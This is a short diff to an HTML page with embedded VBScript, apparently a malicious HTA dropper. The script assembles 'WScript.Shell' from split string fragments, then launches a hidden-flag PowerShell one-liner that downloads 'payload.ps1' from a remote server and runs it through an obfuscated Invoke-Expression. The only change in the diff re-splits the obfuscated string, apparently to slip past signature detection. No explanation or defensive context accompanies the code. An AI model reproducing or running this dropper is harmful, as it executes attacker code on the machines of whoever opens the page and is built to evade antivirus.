@@ -1,7 +1,7 @@
 <HTML> 
 <HEAD> 
 <script language="VBScript">
-	Set WshShell = CreateObject("W"+"S"+"cr"+"ip"+"t."+"Sh"+"e"+"l"+"l")
+	Set WshShell = CreateObject("W"+"S"+"cr"+"ip"+"t."+"S"+"h"+"e"+"l"+"l")
 	Connect="poWErsHeLL.exe -NoPr -CoM (New-Object Net.WebClient).DownloadString('https://server/payload.ps1 ')|.( ([String]''.Chars)[15,18,19]-Join'')"
 	WshShell.Run Connect, 4, true
 
